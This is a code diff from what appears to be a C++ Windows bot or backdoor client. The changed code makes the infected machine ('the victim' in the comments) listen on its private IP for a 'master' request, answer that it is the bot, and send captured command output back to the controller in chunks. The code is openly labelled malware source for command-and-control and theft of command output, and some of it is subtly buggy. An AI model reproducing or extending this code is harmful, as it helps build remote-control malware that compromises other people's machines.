@@ -17,22 +17,24 @@ uint32_t findMastersIP()
     SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
     if (s == INVALID_SOCKET)
         std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
-    int error;
+    
+    int opt;
 
     std::string message, response;
     char* buf = new char[65536];
     int fromlen;
 
+    /* setting the socket on the victims private ip i.e "10.0.0.8" and on port*/
     recvAddr.sin_addr.s_addr = getPrivateIP();
-    recvAddr.sin_port = htons(667);
+    recvAddr.sin_port = htons(32568);
     recvAddr.sin_family = AF_INET;
 
-    fromlen = sizeof(recvAddr);
-
-    error = 1;
-    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&error, sizeof(error))<0)
+    opt = 1;
+    /* the OS won't block the port after the application ended*/
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt))<0)
         std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;
 
+    /* binding the socket to the port on the private ip*/
     if(bind(s, (sockaddr*)&recvAddr, sizeof recvAddr) < 0)
         std::cout << "Bind error <" << WSAGetLastError() << ">" << std::endl;
 
@@ -43,18 +45,18 @@ uint32_t findMastersIP()
     /*wait for the master to ask me to connect*/
     do {
         ZeroMemory(buf, 65536);
-        error = recvfrom(s, buf, 65536, 0, (sockaddr*)&recvAddr, &fromlen);
-        std::cout << buf << std::endl;
-        if (error < 0)
+        fromlen = sizeof(recvAddr);
+        if(recvfrom(s, buf, 65536, 0, (sockaddr*)&recvAddr, &fromlen) < 0)
         {
             std::cout << "Recieve error <" << WSAGetLastError() << ">" << std::endl;
             goto errorLable;
         }
-    } while (!std::string(buf)._Equal(message));
+    } while (!(std::string(buf) == std::to_string(protocol::REQ)));
 
-    error = sendto(s, response.c_str(), response.size(), 0, (sockaddr*)&recvAddr, sizeof(recvAddr));
-    if (error < 0)
+    /* send reply that it's the bot*/
+    if(sendto(s, std::to_string(protocol::RPY).c_str(), response.size(), 0, (sockaddr*)&recvAddr, sizeof(recvAddr)) < 0)
         std::cout << "Send error <" << WSAGetLastError() << ">" << std::endl;
+
 
 errorLable:
     delete[] buf;
@@ -65,6 +67,8 @@ errorLable:
 int sendStdOut(SOCKET s, std::string& message)
 {
     std::string part;
+
+    /* in case the command has no output*/
     if (message.size() == 0)
     {
         part = "no output";
@@ -72,7 +76,7 @@ int sendStdOut(SOCKET s, std::string& message)
             return 1;
     }
 
-    /*spilitting messages to 4096*/
+    /* spilitting messages to 4096*/
     while (message.size() >= 4096)
     {
         part = message.substr(0, 4095);
@@ -81,6 +85,7 @@ int sendStdOut(SOCKET s, std::string& message)
             return 1;
     }
 
+    /* send the rest of the packet*/
     if(send(s, message.c_str(), message.size(), 0) < 0)
         return 1;
 
